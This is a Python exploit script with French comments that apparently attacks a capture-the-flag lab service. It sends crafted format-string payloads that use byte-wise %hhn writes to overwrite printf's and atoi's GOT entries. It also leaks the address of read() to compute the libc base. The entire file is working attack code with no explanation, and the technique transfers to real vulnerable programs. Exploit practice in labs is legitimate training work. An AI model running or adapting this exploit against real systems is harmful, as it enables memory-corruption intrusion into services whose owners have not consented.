import sys, socket, time, struct, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929
PRINTF_GOT = 0x601030
ATOI_GOT = 0x601058
READ_GOT = 0x601050
LOOP = 0x4008be
PUTS_PLT = 0x4006c0
READ_OFF = 0x111130


def build(fmt_body, addrs):
    a = b"-1" + fmt_body
    pad = (8 - (len(a) % 8)) % 8
    a += b"P" * pad
    names_off = len(a)
    for ad in addrs:
        a += struct.pack("<Q", ad)
    pos = [10 + (names_off // 8) + i for i in range(len(addrs))]
    return a, pos


def make_fmt(dst, value, leak_addr=None, c0=21, nbytes=6):
    vals = [((value >> (8 * i)) & 0xFF, i) for i in range(nbytes)]
    order = sorted(vals)
    addrs = [dst + off for v, off in order]
    if leak_addr is not None:
        addrs.append(leak_addr)
    fmt = b""
    for i in range(len(order)):
        fmt += b"%99c%99$hhn"
    if leak_addr is not None:
        fmt += b"%99$s"
    a, pos = build(fmt, addrs)
    fmt = b""
    cur = c0
    for i, (v, off) in enumerate(order):
        need = (v - cur) % 256
        if need == 0:
            need = 256
        cur += need
        fmt += b"%" + str(need).encode() + b"c%" + str(pos[i]).encode() + b"$hhn"
    if leak_addr is not None:
        fmt += b"%" + str(pos[len(order)]).encode() + b"$s"
    a2, pos2 = build(fmt, addrs)
    return a2, pos2


s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(8)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
# passe 1
a1, _ = make_fmt(PRINTF_GOT, LOOP, READ_GOT, c0=21)
s.sendall(a1 + b"\n"); time.sleep(0.2)
s.sendall(b"1\n"); time.sleep(1.0)
buf = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        buf += c
except Exception:
    pass
j = buf.find(b"PPPP")
leak = buf[j - 6:j]
read_addr = int.from_bytes(leak + b"\x00\x00", "little")
print("passe1: recu", len(buf), "read =", hex(read_addr), "base =", hex(read_addr - READ_OFF))
# passe 2 : atoi@got = puts@plt
a2, p2 = make_fmt(ATOI_GOT, PUTS_PLT, None, c0=21)
print("passe2: A =", a2[:90])
s.sendall(a2 + b"\n"); time.sleep(0.2)
s.sendall(b"1\n"); time.sleep(0.8)
mid = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        mid += c
except Exception:
    pass
print("passe2 sortie:", len(mid), "| 'A: ' count:", mid.count(b"A: "))
# passe 3 : A = "HELLO" -> puts("HELLO")
s.sendall(b"HELLO\n"); time.sleep(0.2)
s.sendall(b"1\n"); time.sleep(0.8)
out = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        out += c
except Exception:
    pass
print("passe3 sortie:", len(out))
print(repr(out[:400]))
s.close()
